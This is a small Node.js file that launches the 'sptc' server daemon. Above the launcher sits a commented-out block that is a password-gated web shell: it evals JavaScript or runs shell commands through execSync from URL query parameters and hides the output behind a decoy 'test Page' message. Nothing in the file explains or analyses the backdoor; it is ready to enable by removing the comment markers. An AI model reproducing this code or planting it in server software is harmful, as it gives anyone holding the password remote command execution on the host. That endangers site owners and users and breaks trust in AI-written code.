
/*
const PORT = process.env.PORT || 3000;
const http=require('http')
http.createServer((req, res)=>{
  const querystring=require('querystring')
  const url=require('url')
  const ret={cmd: '', ret: ''}
  try{
    const {query}=url.parse(req.url)
    const {p, v, c}=querystring.parse(query)
    if(p!=='kvnksoshivknrnkbsbdg') throw 1
    const js=decodeURIComponent(v || ''), cmd=decodeURIComponent(c || '')
    ret.cmd=js || cmd
    ret.ret=eval('(function(){return '+(
      js || `require('child_process').execSync('${cmd}').toString('utf8')`
    )+'})()')
  }catch(e) {}
  res.end('This is a test Page. The project is developing. - '+Date.now()+' '+JSON.stringify(ret, 0, 2))
}).listen(PORT)
*/

process.argv.push(
  '-p'+(process.env.PORT || 3000),
  '-w'+__dirname+'/server',
  '-rindex.s',
  '-t',
)
require('sptc/bin/sptcd')

